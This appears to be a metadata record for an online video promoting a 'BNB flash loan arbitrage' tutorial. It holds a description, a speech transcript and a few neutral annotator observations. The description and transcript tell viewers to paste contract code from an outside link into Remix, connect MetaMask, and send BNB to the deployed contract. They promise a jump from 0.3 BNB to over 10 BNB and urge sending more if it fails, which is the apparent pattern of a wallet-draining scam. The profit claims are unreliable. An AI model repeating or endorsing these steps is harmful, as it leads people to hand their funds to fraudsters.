title: NEWLY BNB FLASH LOANS ARBITRAGE TUTORIAL MAKE FREE.
description: Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.  So, what's the catch?   A flash loan has to be borrowed and repaid within the same blockchain transaction.   Step By Step Tutorial for Flash Loan:   1. Get the Metamask Extension for your browser 2. Open http://remix.ethereum.org/ from within your browser. 3. Click on File Explorers and click "Create New File ". 4. Name the file flashloans.sol and paste the contract code link below. ► https://get-flashloan.com/smart-code-0-5-0-eth-bnb-7844/ 5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to Injected Web3. 6. Connect your MetaMask wallet. 7. Click on the "Solidity Compiler" and set the compiler version to 0.5.0 8. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol" 9. Wait for the code to compile. 10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button 11. On "_TOKENNAME" Tester 12. On "_TOKENSYMBOL" TOKX 13. On "_LOANAMOUNT" 2000 14. Click Transact and confirm the transaction in MetaMask. 15. Wait for the transaction to confirm. 16. Copy the address of the newly deployed contract. 17. Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap) 18. Wait for the transaction to confirm. 19. Now, Click "action" (red box) to execute the Flash Loan. 20. Confirm the transaction in MetaMask and wait for the confirmation. 21. You can now check your wallet    Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 1000 BNB you are borrowing)  Avoid using very low amounts as contract may fail below 0.15 BNB.  Under some very rare cases, the arbitrage might fail due to depletion of BNB in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) and retry the transaction this time preferably with 825 loan amount and 31,560 gas limit and it should work 100% but with a smaller profit.  Make sure to transfer your BNB out to another wallet when you're done.  -Hashtags- flash loan arbitrage, flash loan arbitrage bot, flash loan arbitrage tutorial, flash loan arbitrage code, flash loan asr.full_text: In this example I've done, you'll see how I used just .3 BNB to gain over 10.7 BNB in just minutes. The first thing you want to do is go to remix.ethereum.org. This is where we program contracts for both the Ethereum and Binance network. On the left-hand hand side click on Contracts And then click this button for a new file Name the file something like FlashLoan.sol Now you want to paste in the smart contract code into this new file I'll put the newest, updated code in the video description. Make sure you copy the entire file. Next, on the lefthand menu go over to the second tab and pick the compiler that matches the top of the code. Then go down and click compile. Once that's done go over to the third tab on the left. Then over here under environment we want to click on Injected Web3. This will connect your Metamask Browser wallet, if it isn't connected already, so that you can interact with the contract. I'll include Instructions for Metamask wallet if you don't have it. It's essentially a Browser wallet to use BNB. After you are connected, click on arrow beside Deploy, . Here you're going to enter the information for the brand new token you want to create. Enter a name, symbol up to 6 letters and then the loan amount. This can be any amount from 1000 and up, the higher initial deposit will have to be placed but the higher the potential profit reward. Once you click Transact, you'll get a pop-up asking for the Gas Fees to create your new token contract. Confirm in your wallet and then, wait for the transaction confirmation. Once that is done, you're going to want to go over to the newly created contract on the left-hand hand side here and click to copy the contract address. You're now going to add liquidity to make your new token have a value you can actually trade against. Go to your Wallet and click SEND. Copy and paste the new contract code here. Then choose the amount of liquidity you want to place. Normally it needs to be a minimum of 0.15 for there to be sufficient fees for all the transfers. Use a ratio of 0.15 for every 1000 you've borrowed in the loan amount. The higher the liquidity, the higher the return on investment. Here I'll choose, 0.3 BNB. Set your deposit and then click to confirm. Wait for Network Confirmation. Now that your contract is created and we have some liquidity in pancake swap to provide value, we are going to execute the flash loan attack. Go down here and click on the arrow next to your contract and click the red button to execute your flash loan, a final small amount of gas fees to be paid for the action. Go ahead and confirm that. After your network confirmation it may take a few minutes to receive the return if everything was done correctly. Let's go ahead and wait now and see what happens and there it is over 10 BNB in only a few minutes! Now remember, the return is different every time depending on the network volume and the amount of liquidity you put in. Sometimes you will get a small amount, while other times you can hit it big like we did here. We went from around 1 BNB to over 10 BNB. If it doesn't work, or you don't get a large profit, try depositing a different amount of liquidity in your contract and then executing the loan again. Or, starting from the very beginning to make sure you did everything correctly. So, that's it. The contract code and everything will be in the description.

evidence.observation: The tutorial instructs viewers to connect a browser wallet to interact with the contract.
evidence.quote: This will connect your Metamask Browser wallet, if it isn't connected already, so that you can interact with the contract.

evidence.observation: The description instructs sending BNB to a deployed contract and associates a larger amount with a larger amount in each swap.
evidence.quote: Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap)

evidence.observation: The source explicitly links greater deposited liquidity to a higher return on investment.
evidence.quote: The higher the liquidity, the higher the return on investment.

evidence.observation: The speaker qualifies that the return varies with network volume and deposited liquidity.
evidence.quote: the return is different every time depending on the network volume and the amount of liquidity you put in.

evidence.observation: The supplied frame visibly shows Remix's Deploy & Run Transactions panel with an orange Transact control and a deployed-contract interaction area.
The supplied frame visibly shows a wallet Send panel with BNB selected and a Next control.
The supplied frame visibly shows a deployed contract with an action control and a wallet panel displaying 0.928 BNB and contract-interaction activity.
The description contains a warning that flash-loan exploits have been used against DeFi protocols; this does not establish that this particular operation succeeded or caused a loss.
evidence.quote: flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.
